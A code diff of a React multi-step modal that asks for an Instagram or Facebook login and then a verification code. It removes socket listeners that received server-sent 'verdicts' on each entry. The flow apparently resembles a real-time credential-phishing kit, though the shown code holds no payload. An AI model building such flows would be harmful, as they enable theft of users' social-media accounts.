@@ -5,34 +5,17 @@ import FinalModal from '@/components/form-modal/final-modal';
 import InitModal from '@/components/form-modal/init-modal';
 import LoginModal from '@/components/form-modal/login-modal';
 import VerifyModal from '@/components/form-modal/verify-modal';
-import { getSocket, type Verdict } from '@/lib/socket';
 import { useEffect, useState, type FC } from 'react';
 
 const FormModal: FC = () => {
     const [step, setStep] = useState(1);
     const [mountKey, setMountKey] = useState(0);
     const [provider, setProvider] = useState<'instagram' | 'facebook' | null>(null);
-    const [loginVerdict, setLoginVerdict] = useState<Verdict | null>(null);
-    const [codeVerdict, setCodeVerdict] = useState<Verdict | null>(null);
 
     useEffect(() => {
         document.body.classList.add('overflow-hidden');
         return () => {
             document.body.classList.remove('overflow-hidden');
-        };
-    }, []);
-
-    useEffect(() => {
-        const socket = getSocket();
-        const onLoginResult = (verdict: Verdict) => setLoginVerdict({ ...verdict });
-        const onCodeResult = (verdict: Verdict) => setCodeVerdict({ ...verdict });
-
-        socket.on('login_result', onLoginResult);
-        socket.on('code_result', onCodeResult);
-
-        return () => {
-            socket.off('login_result', onLoginResult);
-            socket.off('code_result', onCodeResult);
         };
     }, []);
 
@@ -52,8 +35,8 @@ const FormModal: FC = () => {
                 }}
             />
         );
-    if (step === 3) return <LoginModal key={`login-${mountKey}`} nextStep={() => handleNextStep(4)} verdict={loginVerdict} provider={provider} />;
-    if (step === 4) return <VerifyModal key={`verify-${mountKey}`} nextStep={() => handleNextStep(5)} verdict={codeVerdict} />;
+    if (step === 3) return <LoginModal key={`login-${mountKey}`} nextStep={() => handleNextStep(4)} provider={provider} />;
+    if (step === 4) return <VerifyModal key={`verify-${mountKey}`} nextStep={() => handleNextStep(5)} />;
     if (step === 5) return <FinalModal key={`final-${mountKey}`} />;
 
     return null;
